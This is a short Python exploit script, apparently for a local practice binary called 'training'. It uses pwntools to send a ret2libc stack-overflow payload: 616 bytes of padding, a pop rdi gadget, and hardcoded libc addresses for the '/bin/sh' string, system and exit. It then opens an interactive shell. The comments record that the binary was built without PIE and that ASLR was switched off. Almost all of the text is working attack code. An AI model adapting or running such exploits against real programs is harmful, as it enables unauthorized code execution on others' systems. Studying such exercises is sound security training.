#!/usr/bin/python

# "training.c" compiled with: gcc -no-pie training.c -o training
# ASLR disabled with: sudo su; echo 0 > /proc/sys/kernel/randomize_va_space

# arch: 64 bit
# protections: NX
# vuln type / strategy: stack-based overflow - ret2libc. Calling system to run /bin/sh

# offset: 616

from pwn import *

libc_base = (0x00007ffff7dd4000)
pop_rdi = (0x000000000040123b)
arg = (libc_base + 0x198882)
system = (libc_base + 0x49860)
ret_exit = (libc_base + 0x3f100)

payload = b"A"*616
payload += p64(pop_rdi)
payload += p64(arg)
payload += p64(system)
payload += p64(ret_exit)

r = process('./training')
r.sendline(payload)
r.interactive()

